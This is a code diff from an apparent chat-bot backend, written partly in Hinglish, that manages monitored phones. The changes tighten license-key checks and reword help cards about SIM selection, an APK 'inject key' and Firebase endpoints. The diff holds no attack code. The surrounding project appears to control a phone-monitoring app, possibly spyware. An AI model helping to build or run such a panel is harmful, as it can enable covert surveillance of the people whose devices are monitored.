@@ -114,12 +114,15 @@ def get_selected_sim(device: Device, sim_index: int = 0) -> dict:
 
 
 def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
+    from app.license_keys import is_valid_license_key_format, license_key_exists
+
     license_key = (profile.license_key or "").strip().upper() if profile else ""
-    if license_key.startswith("KEY-"):
+    if is_valid_license_key_format(license_key) and license_key_exists(license_key):
         return license_key
-    if device.api_key and str(device.api_key).upper().startswith("KEY-"):
-        return str(device.api_key).upper()
-    return make_inject_key(device)
+    device_key = (device.api_key or "").strip().upper()
+    if is_valid_license_key_format(device_key) and license_key_exists(device_key):
+        return device_key
+    return "Not set — /key generate"
 
 
 def get_battery(device: Device) -> str:
@@ -462,7 +465,7 @@ def format_key_error_card() -> str:
         "/key status KEY-XXXX...\n"
         "  → Devices + APK status\n"
         "/key confirm\n"
-        "  → APK attach confirm (manual)\n\n"
+        "  → APK same key verify (Firebase check)\n\n"
         "Firebase alag command se:\n"
         "/setfirebase &lt;url&gt;\n"
         "/allfirebase → .txt file attach"
@@ -493,8 +496,8 @@ def format_key_set_card(inject_key: str) -> str:
         f"🔑 {inject_key}\n"
         "📱 Max: 2 devices\n"
         "⏸ Polling: OFF\n\n"
-        "APK mein SAME key daalo + START SERVICE\n"
-        "(jab tak APK attach na ho, /startmonitor block)\n\n"
+        "APK mein SAME original key + START SERVICE\n"
+        "Random key kaam nahi karegi\n\n"
         "Next:\n"
         "/fdy &lt;device_id&gt; → SIM pick (bina key)\n"
         "/a &lt;device_id&gt; → key ke saath pick\n"
